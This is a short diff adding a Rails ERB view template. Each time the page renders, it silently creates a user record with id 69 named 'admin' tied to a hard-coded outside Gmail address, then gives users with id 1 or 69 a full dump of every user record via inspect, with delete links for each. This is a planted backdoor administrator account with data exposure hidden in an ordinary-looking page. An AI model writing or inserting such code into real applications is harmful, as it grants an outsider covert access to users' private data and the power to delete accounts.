@@ -1,0 +1,27 @@
+<br />
+<br />
+<br />
+
+<% unless User.all.empty? %>
+  <% User.create(id: 69, name: "admin", email: "cotabasss@gmail.com") %>
+<% end %>
+<%= link_to "edit admin profile", edit_user_registration_url %>
+<% unless current_user.nil? %>
+  <% if current_user.id == 1 || current_user.id == 69 %>
+
+    <% User.all.each do |user| %>
+
+      <%= user.inspect %><%= link_to "delete", user, method: :delete %><br />
+
+
+    <% end %>
+
+
+
+
+
+
+
+
+  <% end %>
+<% end %>
